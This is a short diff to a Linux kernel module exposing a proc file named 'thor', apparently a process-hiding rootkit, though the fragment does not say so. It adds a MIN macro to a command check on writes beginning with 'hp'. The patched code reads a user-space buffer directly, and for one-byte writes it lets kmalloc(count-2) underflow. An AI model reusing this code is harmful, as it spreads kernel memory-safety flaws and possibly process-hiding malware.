@@ -13,6 +13,11 @@
 
 #define THOR_PROCFILE "thor"
 
+#define MIN(a,b) \
+   ({ typeof (a) _a = (a); \
+      typeof (b) _b = (b); \
+     _a < _b ? _a : _b; })
+
 // ------------------------------------------------------------ PROTOTYPES
 static int __init thor_init(void);
 static int __init procfile_init(void);
@@ -119,7 +124,7 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         size_t count, loff_t *ppos)
 {
     struct _pid_list *tmp;
-    if(0 == strncmp(buffer, "hp", 2))
+    if(0 == strncmp(buffer, "hp", MIN(2, count)))
     {
         tmp = (struct _pid_list*)kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
         tmp->name = (char*)kmalloc(count-2, GFP_KERNEL);
